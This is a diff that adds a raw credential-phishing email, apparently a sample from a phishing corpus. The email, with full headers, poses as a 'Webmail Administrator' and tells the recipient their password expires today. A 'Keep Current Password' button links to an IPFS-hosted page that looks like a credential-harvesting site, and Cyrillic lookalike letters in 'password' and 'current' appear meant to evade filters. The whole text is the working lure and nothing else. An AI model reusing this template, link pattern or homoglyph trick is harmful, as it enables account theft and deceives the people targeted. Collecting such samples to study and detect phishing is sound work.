@@ -1,0 +1,205 @@
+From jose@monkey.org Tue May 16 15:42:21 2023 +0000
+Return-Path: no-reply@digitechitsupport.com
+Delivered-To: jose@monkey.org
+X-FDA: 80796534882.22.D0F9E8C
+Received: from mail1.digitechitsupport.com (mail1.digitechitsupport.com [91.208.184.212])
+	by imf05.b.hostedemail.com (Postfix) with ESMTP id 79A2C1C0003
+	for <jose@monkey.org>; Tue, 16 May 2023 15:42:19 +0000 (UTC)
+Authentication-Results: imf05.b.hostedemail.com;
+	dkim=fail ("headers rsa verify failed") header.d=digitechitsupport.com header.s=default header.b=MwkryYzE;
+	dmarc=pass (policy=reject) header.from=digitechitsupport.com;
+	spf=pass (imf05.b.hostedemail.com: domain of no-reply@digitechitsupport.com designates 91.208.184.212 as permitted sender) smtp.mailfrom=no-reply@digitechitsupport.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1684251740;
+	h=from:from:sender:reply-to:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:list-unsubscribe:dkim-signature;
+	bh=mbIaV+YIQ6uPrtOYE2iwes0Kb8hCl/7dA4X7D2Z2opk=;
+	b=Do1w/iZGrWcTmozJuzG3/7C2K5IuTQcVEFvBfHHM0nO3m1xQVoiAfkd4BF3sdWNIYKmJpC
+	KNWIkqSSHPIZf4UHKlw+UBQPPDAwzL3u1eKswiRrzHwakpf+HTGY38F5F98r1JsyfbWHYm
+	zVmZjySKVhvDu9mQvmPVtl71v/lKwOc=
+ARC-Authentication-Results: i=1;
+	imf05.b.hostedemail.com;
+	dkim=fail ("headers rsa verify failed") header.d=digitechitsupport.com header.s=default header.b=MwkryYzE;
+	dmarc=pass (policy=reject) header.from=digitechitsupport.com;
+	spf=pass (imf05.b.hostedemail.com: domain of no-reply@digitechitsupport.com designates 91.208.184.212 as permitted sender) smtp.mailfrom=no-reply@digitechitsupport.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1684251740; a=rsa-sha256;
+	cv=none;
+	b=l7lqyxanQpTQkarnaYMtep6yHke5l3vq7x9t0fqili5rPtvlQUntxbatvzejhvyn61kPkG
+	aDZP4MDfSsOjWN0KLQzGhFIg+WP/sSZSTzkLuDYpsUgkZsI5fM1PUJIELIXBuqP1XE9fHZ
+	2CupcUO3xnseixUcbWA7LA/fAstilR0=
+Received: from ec2-3-125-43-125.eu-central-1.compute.amazonaws.com (ec2-3-125-43-125.eu-central-1.compute.amazonaws.com [3.125.43.125])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by mail1.digitechitsupport.com (Postfix) with ESMTPSA id C0B95307EE
+	for <jose@monkey.org>; Tue, 16 May 2023 17:47:26 +0300 (EEST)
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed;
+	d=digitechitsupport.com; s=default; h=Reply-To:From:To:Subject:
+	MIME-Version:List-Unsubscribe:Organization:Content-Type; bh=nkNq
+	tztJOybe/hkOjaoF/pDgJ/w=; b=MwkryYzEHqySZlupt0zLyenfx+QYZgCe2Aet
+	p7sLDnfc2BcD8w4IPx1EHXhRJzA0ZAUdFA1UOOrbm8fQ846rOl4O2Xudm0XT3yDh
+	CmYEWU8IcAD01r1DehqofPIoSsZsF3YHRCgrLCxXBlkU8c7oWZxmHOwctqmGaI6U
+	fizDnT8Priez36K5JDZx6Eh5QS39roATpmCD0ueu4sfLK4RpXBynZUSZUjEPiIO/
+	kYiv3AEo3VhaQjzCqi22PhX2d6aLf+YCfNM5CdtF1BKQeDrHGVv6k5vBXeGV+H3N
+	rZtesf0tpY5UqVJfZFD88qxHjcg5hzsOeuEgv4jaGV0foUWB2Q==
+Reply-To: Webmail Administrator <no-reply@digitechitsupport.com>
+From: Webmail Administrator <no-reply@digitechitsupport.com>
+To: jose@monkey.org
+Subject: =?UTF-8?B?4pqg77iPIEFjdGlvbiBSZXF1aXJlZDogWW91ciBXZWJtYWlsIFBhc3N3b3JkIEV4cGlyZXMgVG9kYXkhISE=?=
+Date: 16 May 2023 14:47:26 +0000
+Message-ID: <20230516144726.B5BCE41D03560148@digitechitsupport.com>
+MIME-Version: 1.0
+List-Unsubscribe: <mailto:no-reply@digitechitsupport.com>
+Organization: monkey.org
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0012_12950A60.275E4B2C"
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: 79A2C1C0003
+X-Stat-Signature: pzh3yhsztyydi9f64xj3ah8a5k84agei
+X-Rspam-User: 
+X-Spam-Status: No, score=2.48
+X-HE-Tag: 1684251739-407132
+X-HE-Meta: U2FsdGVkX19c9DjC/dMculeb9bbGh10bs00XUbSgGKWCpXot6AP1wrvrcyKYZI4HeFCVR3Uue8bYAajZHZ0SHbKTAqqDkod7VkFJ9C69lZOLtTomabXoK+WSQ+MHWou4PyfDiRrp8NpdQqxnzylAqlrAUhgCc1+gS0/MkAhmWQwlHlJ8B5HiH+2lPAcRElW1Q32rT1A42OC/6FKAeDO77NBRerRAPP3tSnbxFiifQSbeNlR7PU6iLL0sVt5fmNulWek4sRH6rxNQ5U0iulQLcjxLIz5us/LiNZfHwQ0c7RwfaLGBPXWyr49JrHN9Uh4TtAX0JC/dlF1Ku2gk8I0wuYjyg7sODvgsCRdjd7QFlGA6YiGWnZ2oMtu48hP/gH8xzVUDUzDOdHVNCdTWToDKK3coIf1kYS5A0g61MZkCL5HuVEqEqMulEVfdo7tc6efTGsb04sGIQOZqIi/QSyppMyE4ZOULtkThsIRniu6rnCSYWLYb7X9gagK28CAc1kbtBXSSdfpYC3u1yjMsl+WdAA==
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 120
+
+------=_NextPart_000_0012_12950A60.275E4B2C
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hello jose,=C2=A0
+
+The passw=D0=BE=D0=B3d to your=C2=A0webmail (jose@monkey.org) will expire t=
+oday,
+
+Your mailbox will=C2=A0get you=C2=A0logged out and generate a new passw=D0=
+=BE=D0=B3d=20
+in the next=C2=A0few hours.
+=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=
+=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=
+=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=
+=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=20
+=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=
+=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=
+=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=
+=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=20
+=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=
+=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=
+=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=
+=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0=C2=A0
+Alternatively,=C2=A0if you want to continue using your cu=D0=B3=D0=B3ent=20=
+
+passw=D0=BE=D0=B3d, use=C2=A0the button below to=C2=A0retain=C2=A0cu=D0=B3=
+=D0=B3ent passw=D0=BE=D0=B3d.
+
+=C2=A0
+
+Keep Cu=D0=B3=D0=B3ent Passw=D0=BE=D0=B3d=20
+(=C2=A0https://cloudflare-ipfs.com/ipfs/QmaZ6Fn3ST2WPxYtSvrcDbubD1owpJRKT8b=
+rxBZawnHJwx#jose@monkey.org=C2=A0)
+
+
+=C2=A0
+
+
+
+This email is generated by monkey.org's mail server for=20
+jose@monkey.org.
+------=_NextPart_000_0012_12950A60.275E4B2C
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+  <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+  <meta http-equiv=3D"content-type" content=3D"text/html; charset=3DISO-885=
+9-1">
+  <title></title>
+</head>
+<body>
+<br>
+<table width=3D"100%" class=3D"v1v1text_block" style=3D"text-align: left; c=
+olor: rgb(0, 0, 0); text-transform: none; letter-spacing: normal; font-fami=
+ly: Roboto,sans-serif; font-size: 14px; font-style: normal; font-weight: 40=
+0; word-spacing: 0px; white-space: normal; border-collapse: collapse; orpha=
+ns: 2; widows: 2; background-color: rgb(255, 255, 255);" border=3D"0" cells=
+pacing=3D"0" cellpadding=3D"0">
+  <tbody>
+    <tr>
+      <td style=3D"padding: 10px 40px; text-align: justify;">
+      <div style=3D"padding-top: 0px; font-family: Tahoma,Verdana,sans-seri=
+f; border-top-width: 0px; border-top-style: none;">
+      <div style=3D"color: rgb(85, 85, 85); line-height: 1.5; padding-top: =
+0px; font-family: Lato,Tahoma,Verdana,Segoe,sans-serif; font-size: 12px; bo=
+rder-top-width: 0px; border-top-style: none;">
+      <p style=3D"margin: 0px 0px 0px 40px;"><span style=3D"font-size: 14px=
+;"><font color=3D"#000000">Hello
+jose,&nbsp;<br>
+      <br>
+The passw&#1086;&#1075;d to your&nbsp;webmail<span> (jose@monkey.org) </spa=
+n>will
+expire today,<br>
+      <br>
+      </font></span></p>
+      <p style=3D"margin: 0px 0px 0px 40px;"><span style=3D"font-size: 14px=
+;"><font color=3D"#000000">Your mailbox
+will&nbsp;get you&nbsp;logged out and generate a new passw&#1086;&#1075;d i=
+n the next&nbsp;few hours.</font></span><span style=3D"font-size: 14px;"><f=
+ont color=3D"#000000"><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;</font></span><span>&nbsp;</span>&nbsp;<font color=3D"=
+#000000">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;</font><span style=3D"font-size: 14px;"><font co=
+lor=3D"#000000"><span>&nbsp;</span>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+Alternatively,&nbsp;if you want to continue using your cu&#1075;&#1075;ent =
+passw&#1086;&#1075;d, use&nbsp;the button below to&nbsp;retain&nbsp;cu&#107=
+5;&#1075;ent passw&#1086;&#1075;d.<br>
+<br>
+&nbsp;</font></span></p>
+<p style=3D"margin: 0px;"></p><div style=3D"text-align: center;"><a style=
+=3D"margin: 5px; padding: 10px; border: 0px solid rgb(0, 120, 212); border-=
+image: none; width: 168px; color: rgb(255, 255, 255); line-height: 40px; fo=
+nt-family: inherit; font-size: 16px; vertical-align: baseline; font-stretch=
+: inherit; background-color: rgb(0, 120, 212);" href=3D"https://cloudflare-=
+ipfs.com/ipfs/QmaZ6Fn3ST2WPxYtSvrcDbubD1owpJRKT8brxBZawnHJwx#jose@monkey.or=
+g" target=3D"_blank" rel=3D"noreferrer">
+Keep Cu&#1075;&#1075;ent Passw&#1086;&#1075;d</a><br></div><p style=3D"marg=
+in: 0px;">
+<br>
+&nbsp;</p>
+      </div>
+      </div>
+      </td>
+    </tr>
+  </tbody>
+</table>
+<div style=3D"text-align: center;"><font size=3D"1" style=3D"text-align: le=
+ft; color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spa=
+cing: normal; font-family: Roboto,sans-serif; font-style: normal; font-weig=
+ht: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; bac=
+kground-color: rgb(255, 255, 255);">This email is generated by monkey.org<s=
+pan>'s
+</span>mail
+server for jose@monkey.org.<span></span><span style=3D'text-align: left; co=
+lor: rgb(51, 51, 51); text-transform: none; text-indent: 0px; letter-spacin=
+g: normal; font-family: "Source Sans Pro",Calibri,Candara,Arial,sans-serif;=
+ font-size: 15px; font-style: normal; font-weight: 400; word-spacing: 0px; =
+float: none; display: inline !important; white-space: normal; orphans: 2; w=
+idows: 2; background-color: rgb(245, 245, 245);'></span></font></div>
+
+
+</body></html>
+------=_NextPart_000_0012_12950A60.275E4B2C--
